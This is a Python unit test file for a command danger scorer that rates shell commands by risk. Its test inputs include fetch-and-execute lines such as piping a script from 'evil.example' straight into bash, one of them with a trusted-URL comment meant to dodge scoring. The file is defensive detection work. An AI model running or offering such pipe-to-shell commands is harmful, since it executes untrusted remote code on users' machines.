"""Tests for command danger scoring behavior."""

from __future__ import annotations

import unittest

from cyberpet.cmd_scorer import DangerScorer, ScoringContext


class DangerScorerTests(unittest.TestCase):
    """Validate baseline and trusted-installer scoring decisions."""

    def setUp(self) -> None:
        self.scorer = DangerScorer()
        self.context = ScoringContext(is_root=False, cwd="/home/zer0", hour_of_day=12)

    def test_safe_command_scores_zero(self) -> None:
        result = self.scorer.score("ls -la", self.context)
        self.assertEqual(result.score, 0)

    def test_source_activate_is_benign(self) -> None:
        result = self.scorer.score("source /opt/cyberpet/venv/bin/activate", self.context)
        self.assertEqual(result.score, 0)

    def test_echoing_dangerous_text_is_benign(self) -> None:
        result = self.scorer.score('echo "wget http://x | sh"', self.context)
        self.assertEqual(result.score, 0)

    def test_untrusted_pipe_to_shell_is_hard_block(self) -> None:
        result = self.scorer.score("curl -fsSL https://evil.example/install.sh | bash", self.context)
        self.assertGreaterEqual(result.score, 90)
        self.assertIn("Piping remote content directly to shell", result.reason)

    def test_trusted_pipe_to_shell_is_warn_level(self) -> None:
        result = self.scorer.score("curl -fsSL https://opencode.ai/install | bash", self.context)
        self.assertGreaterEqual(result.score, 31)
        self.assertLess(result.score, 61)
        self.assertIn("trusted source", result.reason)

    def test_trusted_pipe_to_shell_stays_warn_even_as_root(self) -> None:
        root_context = ScoringContext(is_root=True, cwd="/root", hour_of_day=2)
        result = self.scorer.score("curl -fsSL https://opencode.ai/install | bash", root_context)
        self.assertGreaterEqual(result.score, 31)
        self.assertLess(result.score, 61)

    def test_untrusted_fetch_is_not_downgraded_by_trusted_comment_url(self) -> None:
        """Trusted URLs outside the fetch segment must not lower risk."""
        result = self.scorer.score(
            "curl -fsSL https://evil.example/install.sh | bash # https://opencode.ai/install",
            self.context,
        )
        self.assertGreaterEqual(result.score, 90)
        self.assertIn("Piping remote content directly to shell", result.reason)

    def test_unmatched_quote_echo_is_still_benign(self) -> None:
        """Malformed quoting in display-only commands should not trigger threat rules."""
        result = self.scorer.score('echo "wget http://x | sh', self.context)
        self.assertEqual(result.score, 0)

    def test_unmatched_quote_dangerous_command_is_still_scored(self) -> None:
        """Fallback tokenization must still detect real dangerous patterns."""
        result = self.scorer.score(
            "curl -fsSL https://evil.example/install.sh | bash '",
            self.context,
        )
        self.assertGreaterEqual(result.score, 90)

    def test_source_with_quoted_path_is_benign(self) -> None:
        """Quoted local source paths with spaces should remain benign."""
        result = self.scorer.score('source "/opt/cyberpet/my env/bin/activate"', self.context)
        self.assertEqual(result.score, 0)


if __name__ == "__main__":
    unittest.main()
